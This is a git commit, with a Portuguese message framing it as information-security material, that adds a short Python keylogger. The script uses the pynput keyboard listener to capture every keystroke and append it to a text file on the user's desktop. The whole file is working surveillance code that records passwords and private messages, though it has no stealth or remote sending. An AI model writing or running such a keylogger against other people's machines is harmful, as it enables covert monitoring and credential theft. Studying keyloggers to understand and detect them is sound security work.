81be711bde6edbf312032606c6a45ea2d470d988
makalau <marcelovictor95@hotmail.com>
2021-12-21 04:11:17 -0300

    KeyLogger em python -  segurança da informação

---
+++ keylogger.py
@@ -0,0 +1,46 @@
+﻿#em pynput, importar o método Listener do teclado
+from pynput.keyboard import Listener
+import sys
+
+
+logFile = r"C:\Users\marcelo\Desktop\keylog.txt"
+
+def writeLog(key):
+
+    teclas = {
+	"Key.space": " ",
+	"Key.shift_r": "",
+	"Key.shift_l": "",
+	"Key.enter": "\n",
+	"Key.alt": "",
+	"Key.esc": "",
+	"Key.cmd": "",
+	"Key.caps_lock": "",
+	}
+
+
+    #converter a tecla pressionada para string
+    keydata = str(key)
+        
+    keydata = keydata.replace("'", "")
+
+    for key in teclas:
+        keydata = keydata.replace(key, teclas[key])
+
+    #abrir o arquivo de log no modo append
+    try:
+        arq = open(logFile)
+
+    except FileNotFoundError:
+        with open(logFile, "w") as arquivo:
+            pass
+
+    with open(logFile, "a") as arquivo:
+        arquivo.write(keydata)
+
+#abrir o Listener do teclado e escutar o evento on_press
+#quando o evento on_press ocorrer, chamar a função writeLog
+with Listener(on_press=writeLog) as listener:
+    listener.join()
+
+ 
